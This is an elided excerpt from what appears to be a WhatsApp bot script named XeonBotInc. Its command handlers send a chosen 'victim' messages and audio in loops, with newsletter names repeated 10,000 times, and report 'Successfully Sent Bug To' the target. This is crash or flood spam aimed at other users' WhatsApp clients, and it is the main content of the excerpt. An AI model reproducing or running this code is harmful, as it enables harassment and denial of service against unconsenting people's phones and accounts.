...
contextInfo: { 
    ...
    businessMessageForwardInfo: { 
        businessOwnerJid:'6285712408309@s.whatsapp.net'
    },
    forwardedNewsletterMessageInfo: {
        newsletterJid: '120363271778049922@newsletter',
        serverMessageId: 103,
...
`.trim()
  ...
  title: `${botname}`,
  body: `FORGET DONATE`,
  thumbnailUrl: 'https://telegra.ph/file/896be7e547d43d2dbd647.png',
  sourceUrl: global.link,
  mediaType: 1,
  renderLargerThumbnail: true
                        }
...
❎ ERROR FIX SENDIRI"`
            ...
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': 'cta_url',
                'buttonParamsJson': "{\"display_text\":\"🌐 SourceCode\",\"url\":\"https://whatsapp.com/channel/0029VaYLbikDDmFLrmrgs90E\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaYLbikDDmFLrmrgs90E\"}"
              },]
            })
          })
        },
...
await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363271778049922@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
...
await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363271778049922@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
...
for (let i = 0; i < amount; i++) {
await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363271778049922@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await XeonBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363271778049922@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case '6': case 'xaudio': {
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await XeonBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363271778049922@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
...
@${m.sender.split('@')[0]}\n\n Powered by @6285712408309 @0`, contextInfo: {
mentionedJid: [m.sender, '6285712408309@s.whatsapp.net','0@s.whatsapp.net']
}})
    ...
    'message': {
      ...
      'interactiveMessage': proto.Message.InteractiveMessage.create({
        ...
        'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
          'buttons': [{
            'name': 'cta_url',
            'buttonParamsJson': "{\"display_text\":\"🔍Script🔎\",\"url\":\"https://whatsapp.com/channel/0029VaYLbikDDmFLrmrgs90E\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaYLbikDDmFLrmrgs90E\"}"
          },]
        })
      })
    },
